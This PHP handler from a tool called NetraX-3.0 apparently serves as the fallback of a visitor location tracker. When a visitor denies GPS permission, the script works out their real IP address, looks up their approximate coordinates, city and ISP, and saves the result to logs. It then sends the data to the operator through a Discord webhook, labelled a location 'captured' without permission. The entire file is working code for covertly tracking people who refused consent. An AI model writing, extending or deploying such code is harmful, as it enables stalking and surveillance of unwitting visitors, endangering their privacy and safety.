<?php
/* ════════════════════════════════════════════════════════════════════
   handlers/ip_location.php  --  IP-Based Geolocation Fallback
   ──────────────────────────────────────────────────────────────────
   When the browser denies GPS permission, this handler determines
   the visitor's approximate location from their IP address using
   the free ip-api.com service (server-side, no client permission
   needed).

   Called by netrax_location_tracker.js as a fallback.
   Saves location, prints to terminal, sends Discord alert.
   ════════════════════════════════════════════════════════════════════ */
header('Content-Type: application/json; charset=UTF-8');
header('X-Content-Type-Options: nosniff');
header('Cache-Control: no-store, no-cache, must-revalidate');

/* ── Discord Webhook Integration ────────────────────────────── */
if (!defined('DISCORD_WEBHOOK_URL')) {
    require_once __DIR__ . '/../core/discord_webhook.php';
}

$date = date('Y-m-d H:i:s');

/* ── Central data directory ── */
$data_dir = dirname(__DIR__) . '/data';
if (!is_dir($data_dir) && !mkdir($data_dir, 0750, true)) {
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Storage unavailable']);
    exit;
}

/* ── Detect the visitor's real IP ─────────────────────────────── */
function getVisitorIP(): string {
    /* Cloudflare real IP header (highest trust) */
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return trim($_SERVER['HTTP_CF_CONNECTING_IP']);
    }
    /* X-Forwarded-For (first entry = original client) */
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $parts = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $first = trim($parts[0]);
        if (filter_var($first, FILTER_VALIDATE_IP)) {
            return $first;
        }
    }
    /* X-Real-IP (nginx proxy) */
    if (!empty($_SERVER['HTTP_X_REAL_IP'])) {
        $ip = trim($_SERVER['HTTP_X_REAL_IP']);
        if (filter_var($ip, FILTER_VALIDATE_IP)) {
            return $ip;
        }
    }
    /* Direct connection */
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

$visitor_ip = getVisitorIP();

/* ── Prevent duplicate sends (flag-based dedup) ───────────────── */
$dedup_file = $data_dir . '/.ip_location_sent_' . md5($visitor_ip);
if (file_exists($dedup_file)) {
    /* Already sent IP-based location for this IP in this session */
    echo json_encode(['status' => 'already_sent', 'message' => 'IP location already captured']);
    exit;
}

/* ── Query ip-api.com for geolocation ─────────────────────────── */
$api_url = 'http://ip-api.com/json/' . urlencode($visitor_ip) . '?fields=status,message,lat,lon,city,regionName,country,isp,query,timezone';

$geo_data = null;

/* Try cURL first */
if (function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => $api_url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS      => 3,
        CURLOPT_HTTPHEADER     => ['User-Agent: NetraX-Bot/3.0'],
    ]);
    $response = curl_exec($ch);
    $http_code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code === 200 && $response) {
        $geo_data = json_decode($response, true);
    }
} else {
    /* Fallback: file_get_contents */
    $opts = [
        'http' => [
            'method'  => 'GET',
            'header'  => "User-Agent: NetraX-Bot/3.0\r\n",
            'timeout' => 10,
        ],
    ];
    $context  = stream_context_create($opts);
    $response = @file_get_contents($api_url, false, $context);
    if ($response) {
        $geo_data = json_decode($response, true);
    }
}

/* ── Validate API response ────────────────────────────────────── */
if (!$geo_data || ($geo_data['status'] ?? '') !== 'success') {
    $err_msg = $geo_data['message'] ?? 'IP geolocation lookup failed';
    file_put_contents('php://stderr', "[NetraX-3.0] IP Geolocation FAILED for {$visitor_ip}: {$err_msg}\n");
    http_response_code(502);
    echo json_encode(['status' => 'error', 'message' => $err_msg]);
    exit;
}

$latitude  = (float) $geo_data['lat'];
$longitude = (float) $geo_data['lon'];
$city      = $geo_data['city'] ?? 'Unknown';
$region    = $geo_data['regionName'] ?? 'Unknown';
$country   = $geo_data['country'] ?? 'Unknown';
$isp       = $geo_data['isp'] ?? 'Unknown';
$timezone  = $geo_data['timezone'] ?? 'Unknown';

$latText = number_format($latitude, 6, '.', '');
$lonText = number_format($longitude, 6, '.', '');

/* ── Terminal output ──────────────────────────────────────────── */
file_put_contents('php://stderr',
    "[NetraX-3.0] IP-Based Location captured: IP={$visitor_ip}, "
    . "lat={$latText}, lon={$lonText}, city={$city}, {$region}, {$country}\n"
);

/* ── Save to file ─────────────────────────────────────────────── */
$date_file = date('Ymd_His') . '_' . substr(bin2hex(random_bytes(3)), 0, 6);
$mapsUrl   = "https://www.google.com/maps/place/{$latText},{$lonText}";

$data = "=== IP-Based Location Captured ===\n"
      . "Source:    ip_geolocation\n"
      . "IP:        {$visitor_ip}\n"
      . "Latitude:  {$latText}\n"
      . "Longitude: {$lonText}\n"
      . "City:      {$city}\n"
      . "Region:    {$region}\n"
      . "Country:   {$country}\n"
      . "ISP:       {$isp}\n"
      . "Timezone:  {$timezone}\n"
      . "Accuracy:  IP-level (city approximate)\n"
      . "Google Maps: {$mapsUrl}\n"
      . "Date:      {$date}\n\n";

/* ── Append to master location log ── */
$master_log = $data_dir . '/all_locations.log';
$fp = fopen($master_log, 'a');
if ($fp) {
    flock($fp, LOCK_EX);
    fwrite($fp, $data);
    flock($fp, LOCK_UN);
    fclose($fp);
}

/* ── Save individual file ── */
$basename = 'location_ip_' . $date_file . '.txt';
$individual_file = $data_dir . '/' . $basename;
$fp2 = fopen($individual_file, 'x');
if ($fp2) {
    flock($fp2, LOCK_EX);
    fwrite($fp2, $data);
    flock($fp2, LOCK_UN);
    fclose($fp2);
}

/* ── Signal shell script ── */
file_put_contents($data_dir . '/.flag_location', $basename);
file_put_contents('php://stderr', "[NetraX-3.0] IP Location saved: {$individual_file}\n");

/* ── Mark as sent (dedup flag) ── */
file_put_contents($dedup_file, $date);

/* ── Discord alert ────────────────────────────────────────────── */
sendDiscordAlert(
    '📍 IP-Based Location Captured (No GPS Permission)',
    [
        'Source'      => 'ip_geolocation',
        'IP Address'  => $visitor_ip,
        'Latitude'    => $latText,
        'Longitude'   => $lonText,
        'City'        => $city,
        'Region'      => "{$region}, {$country}",
        'ISP'         => $isp,
        'Google Maps' => $mapsUrl,
        'Time'        => $date,
    ],
    15105570   /* 0xE67E22  orange — distinct from green GPS captures */
);

/* ── Return coords to JS (for any client-side use) ── */
echo json_encode([
    'status'    => 'success',
    'message'   => 'IP-based location captured',
    'lat'       => $latText,
    'lon'       => $lonText,
    'city'      => $city,
    'country'   => $country,
    'ip'        => $visitor_ip,
]);
exit;
